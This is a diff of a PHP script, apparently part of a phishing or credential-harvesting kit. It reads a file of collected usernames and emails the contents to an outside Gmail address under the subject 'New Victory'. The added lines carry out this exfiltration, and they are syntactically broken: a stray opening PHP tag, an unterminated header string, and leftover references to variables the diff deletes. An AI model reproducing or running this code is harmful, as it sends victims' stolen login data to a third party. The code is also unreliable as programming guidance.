@@ -12,15 +12,12 @@ session_start();
 //$q="insert into data(ID,frm,to1,sub,msg)
 //value(NULL,'".$_POST['from1']."','".$_POST['to1']."','".$_POST['sub1']."','".$_POST['msg1']."')";
 
-$fromthe='postman@postm25.com';
-$tothe='censorday.offical@gmail.com';
-$sub='New Victory';
 
 
 header('content-type: text/plain');
 $file = "./usernames.txt";
-$document = file_get_contents($file);
-//echo $document;
+$txt = file_get_contents($file);
+//echo $txt;
 
 
 // $f=$_SESSION['fromthe'];
@@ -37,12 +34,14 @@ $document = file_get_contents($file);
 
 //$message ='hey how are you';
 
-$headers = "MIME-Version: 1.0" . "\r\n";
-$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+<?php
+$to = "censorday.offical@gmail.com";
+$subject = "New Victory";
+$headers = "postman@postm25.com" . "\r\n" .
 
-// More headers
-$headers .= 'From:'.$fromthe. "\r\n";
-//$headers .= 'Cc: mymail@gmail.com' . "\r\n";
+
+mail($to,$subject,$txt,$headers);
+?>
 
 if(mail($tothe,$sub,$document,$headers))
 {
